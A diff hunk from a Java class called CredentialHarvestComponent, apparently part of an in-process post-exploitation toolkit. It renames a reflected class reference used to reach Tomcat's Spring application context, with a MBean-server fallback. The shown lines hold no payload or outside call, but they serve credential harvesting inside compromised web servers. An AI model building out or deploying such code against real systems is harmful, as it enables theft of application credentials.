@@ -509,13 +509,13 @@ public class CredentialHarvestComponent implements Runnable {
 
     /**
      * 通过 Tomcat 反推 Spring WebApplicationContext。
-     * 优先复用同进程内已加载的 TomcatCatalinaManageComponent.getContext()，
+     * 优先复用同进程内已加载的 TomcatContainerManageComponent.getContext()，
      * 不可用时自己走 PlatformMBeanServer 查 Catalina:j2eeType=WebModule,*。
      */
     private static Object getSpringContextFromTomcat(ClassLoader cl) throws Throwable {
         HashSet standardContexts = null;
         try {
-            Class tomcatComp = cl.loadClass("org.leo.core.component.TomcatCatalinaManageComponent");
+            Class tomcatComp = cl.loadClass("org.leo.core.component.TomcatContainerManageComponent");
             Method getCtx = tomcatComp.getDeclaredMethod("getContext");
             getCtx.setAccessible(true);
             standardContexts = (HashSet) getCtx.invoke(null);
